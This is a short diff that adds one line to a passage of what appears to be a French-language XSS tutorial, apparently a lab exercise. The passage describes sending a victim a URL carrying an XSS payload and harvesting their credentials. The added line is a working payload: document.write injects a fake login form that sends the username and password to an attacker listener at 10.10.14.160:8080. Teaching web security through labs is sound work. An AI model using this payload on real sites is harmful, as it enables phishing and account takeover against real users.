@@ -191,3 +191,5 @@ Username: test | Password: test
 ```
 
 Avec tout prêt, nous pouvons démarrer notre serveur PHP et envoyer l'URL qui inclut notre charge utile XSS à notre victime, et une fois qu'ils se connectent au formulaire, nous obtiendrons leurs informations d'identification et les utiliserons pour accéder à leurs comptes.
+
+document.write('<h3>Please login to continue</h3><form action=http://10.10.14.160:8080><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>')
